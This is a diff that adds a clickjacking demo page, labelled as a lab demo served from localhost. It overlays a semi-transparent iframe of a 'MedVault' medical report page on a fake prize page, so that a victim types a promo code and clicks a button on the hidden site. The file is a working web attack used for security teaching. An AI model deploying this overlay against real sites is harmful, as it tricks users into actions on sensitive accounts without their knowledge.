@@ -1,0 +1,21 @@
+<!doctype html>
+<!-- ATTACKER PAGE (lab demo only). Served from http://localhost:8000
+     The real MedVault page is loaded in an iframe on top of a fake "prize" page.
+     opacity 0.3 so you can SEE the trick in the demo; a real attacker would use 0. -->
+<html><head><title>Free health checkup!</title><style>
+  body { margin: 0; font-family: Arial, sans-serif; background: #fff7e6; }
+  .bait-text { position: absolute; top: 140px; left: 897px; width: 258px; font-size: 18px; color: #7c2d12; }
+  .fake-box { position: absolute; top: 248px; left: 897px; width: 258px; height: 41px; border: 2px solid #f59e0b; border-radius: 6px; background: #fff; }
+  .fake-btn { position: absolute; top: 309px; left: 897px; width: 258px; height: 35px; background: #e11d48; color: #fff;
+              font-weight: bold; font-size: 16px; display: flex; align-items: center; justify-content: center; border-radius: 6px; }
+  h1 { margin: 60px 0 0 60px; color: #b45309; font-size: 40px; }
+  p.lead { margin: 12px 0 0 60px; font-size: 18px; max-width: 600px; }
+  iframe { position: absolute; top: 0; left: 0; width: 1280px; height: 860px; border: 0; opacity: 0.3; z-index: 2; }
+</style></head><body>
+<h1>Congratulations! You won a FREE full-body checkup</h1>
+<p class="lead">To claim your prize, type the promo code <b>drevil</b> in the box on the right and press the red button.</p>
+<div class="bait-text">Promo code:</div>
+<div class="fake-box"></div>
+<div class="fake-btn">CLAIM PRIZE</div>
+<iframe src="http://localhost:5000/report/1"></iframe>
+</body></html>
